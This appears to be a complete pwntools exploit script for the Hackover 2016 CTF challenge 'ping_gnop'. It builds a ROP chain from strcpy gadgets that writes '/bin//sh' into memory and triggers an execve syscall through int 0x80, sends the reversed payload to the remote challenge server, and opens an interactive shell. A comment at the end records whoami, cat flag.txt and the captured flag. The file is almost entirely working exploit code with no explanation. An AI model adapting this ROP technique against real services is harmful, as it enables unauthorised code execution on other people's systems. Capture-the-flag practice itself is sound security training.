#!/usr/bin/env python


from pwn import *

dest_for_strcpy = 0x80ede21
strcpy = pack(0x80481e0)

pack(0x8048099)  # '/'
pack(0x80e11fb)  # 'b\n'
pack(0x8048fdd)  # 'in'
pack(0x08048059)  # '/'
pack(0x80e0363)  # 's\n'
pack(0x8048266)  # h
pop2ret = pack(0x08049a33)
popret = pack(0x08049a34)
pop_ebx = pack(0x08051102)
xor_ecx = pack(0x080498b3)
xchg_edx_eax = pack(0x0806cf29)
xchg_ebp_eax = pack(0x08082cb8)
strlen = pack(0x805c360)
int_80 = pack(0x0806d9c5)

pattern = "AAA%AAsAABAA$AAnAACAA-AA"
pattern += strcpy + pop2ret + pack(dest_for_strcpy) + pack(0x08048059)
pattern += strcpy + pop2ret + pack(dest_for_strcpy + 1) + pack(0x08048059)
pattern += strcpy + pop2ret + pack(dest_for_strcpy + 2) + pack(0x08048059)
pattern += strcpy + pop2ret + pack(dest_for_strcpy + 3) + pack(0x08048059)
pattern += strcpy + pop2ret + pack(dest_for_strcpy + 4) + pack(0x08048059)
pattern += strcpy + pop2ret + pack(dest_for_strcpy + 5) + pack(0x80e11fb)
pattern += strcpy + pop2ret + pack(dest_for_strcpy + 6) + pack(0x8048fdd)
pattern += strcpy + pop2ret + pack(dest_for_strcpy + 8) + pack(0x08048059)
pattern += strcpy + pop2ret + pack(dest_for_strcpy + 9) + pack(0x805c3ed)
pattern += strcpy + pop2ret + pack(dest_for_strcpy + 10) + pack(0x8048266)
pattern += strlen + popret + pack(dest_for_strcpy)
pattern += xchg_edx_eax
pattern += xor_ecx + pack(dest_for_strcpy)
pattern += pack(0x41414141) * 3
pattern += xchg_edx_eax + int_80
pattern = pattern.ljust(470, '\x45')

payload = "A" * 38 + pack(0x1337cafe) + pattern
payload = payload[::-1]



#p = process("./ping_gnop")
p = remote("challenges.hackover.h4q.it", port=1337)
print(pidof(p))
sleep(0.2)
raw_input()
p.recv()
p.sendline(payload)
print(p.recv(timeout=0.5))
p.interactive("shell> ")
raw_input()


"""whoami
user
cat flag.txt
hackover16{p1nG_p0nG_PiNg_PoNg_piNg_SCORE!}
"""
